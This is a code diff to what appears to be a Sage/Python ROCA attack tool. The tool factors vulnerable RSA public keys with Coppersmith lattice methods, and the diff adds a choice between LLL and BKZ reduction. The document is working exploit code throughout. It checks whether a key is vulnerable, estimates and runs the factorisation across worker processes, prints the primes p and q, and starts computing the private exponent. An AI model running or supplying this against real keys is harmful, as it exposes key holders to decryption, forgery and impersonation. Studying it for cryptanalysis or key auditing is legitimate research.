@@ -49,7 +49,7 @@ param = \
 }
 
 # https://github.com/mimoo/RSA-and-LLL-attacks/blob/master/coppersmith.sage
-def coppersmith_howgrave_univariate(pol, N, beta, mm, tt, XX):
+def coppersmith_howgrave_univariate(pol, N, beta, mm, tt, XX,algo='LLL'):
     """
     Coppersmith revisited by Howgrave-Graham
     
@@ -96,8 +96,11 @@ def coppersmith_howgrave_univariate(pol, N, beta, mm, tt, XX):
         for jj in range(ii+1):
             BB[ii, jj] = gg[ii][jj]
 
+    if algo == 'LLL':
     # LLL
-    BB = BB.LLL(early_red=True, use_siegel=True)
+      BB = BB.LLL(early_red=True, use_siegel=True)
+    else:
+      BB = BB.BKZ(early_red=True, use_siegel=True)
 
     # transform shortest vector in polynomial    
     new_pol = 0
@@ -109,8 +112,7 @@ def coppersmith_howgrave_univariate(pol, N, beta, mm, tt, XX):
 
     return [i[0] for i in potential_roots]
 
-def benchmark(N, cores):
-  
+def benchmark(N, cores, algo='LLL'):
   # Key is not always of perfect size, infer from size
   keylength = int(log(N, 2))
   if keylength < 1000 :
@@ -156,7 +158,8 @@ def benchmark(N, cores):
 
   # Estimate time needed
   total = (((top - start)/cores) * coppersmith_time)
-  print ("[+] Estimated (worst case) time needed for the attack: %s" % humanfriendly.format_timespan(total))
+  print ("[+] Estimated (worst case) time needed for the attack: %s with algo: %s" % (humanfriendly.format_timespan(total),algo))
+  return total
 
 
 class Worker(multiprocessing.Process):
@@ -164,7 +167,7 @@ class Worker(multiprocessing.Process):
   def run(self):
     try:
       # Fetch parameters according to key size
-      N, keylength, start, stop, factors_queue, manager = self._args
+      N, keylength, start, stop, factors_queue, manager,algo = self._args
       M_prime = param[keylength]['M_prime']
       beta = 0.5 
       mm = param[keylength]['m']
@@ -188,7 +191,7 @@ class Worker(multiprocessing.Process):
         pol = x + known_part_pol
         
         # Get roots of polynomial using coppersmith
-        roots = coppersmith_howgrave_univariate(pol, N, beta, mm, tt, XX)
+        roots = coppersmith_howgrave_univariate(pol, N, beta, mm, tt, XX, algo=algo)
          
         # Check if roots are p, q
         for root in roots:
@@ -207,7 +210,7 @@ class Worker(multiprocessing.Process):
         sys.exit(0)
 
 # Top level of the attack, feeds the queue for the workers
-def roca(N, cpus=1):
+def roca(N, cpus=1,algo='LLL'):
   
   # Key is not always of perfect size, infer from size
   keylength = int(log(N, 2))
@@ -239,7 +242,7 @@ def roca(N, cpus=1):
       start, stop = floor(c_prime/2), floor(top / cpus)
     else:
       start, stop = floor(top * (i-1) / cpus), floor(top * i / cpus)    
-    w = Worker(args=(N, keylength, start, stop, factors_queue, manager))
+    w = Worker(args=(N, keylength, start, stop, factors_queue, manager,algo))
     w.start()
     processes.append(w)
 
@@ -280,19 +283,26 @@ if __name__ == '__main__':
       print ("[+] Key is vulnerable!")
       
       # Benchmark one coppersmith and provide time estimate
-      benchmark(pub_key.n, args.cores)
+      t0=benchmark(pub_key.n, args.cores,algo='LLL')
+      t1=benchmark(pub_key.n, args.cores,algo='BKZ')
+      if t0 < t1:
+        algo='LLL'
+      else:
+        algo='BKZ'
+      
+      print("[+] Best matrix reduction algo seems to be:", algo)
       
       # Factorize public key
       timer = Timer()
       timer.start()
-      p, q = roca(pub_key.n, args.cores)
+      p, q = roca(pub_key.n, args.cores,algo=algo)
       stop = timer.stop().cputime
 
       print ("[+] Found factors of N:")
       print ("[+] p =" , p)
       print ("[+] q =" , q)
       print ("[+] Took", stop, "s")
-
+      print ("[+] With matrix reduction best algo:", algo)
       # Construct private key 
       phi = (p-1) * (q-1)
       d = int(inverse_mod(pub_key.e, phi))
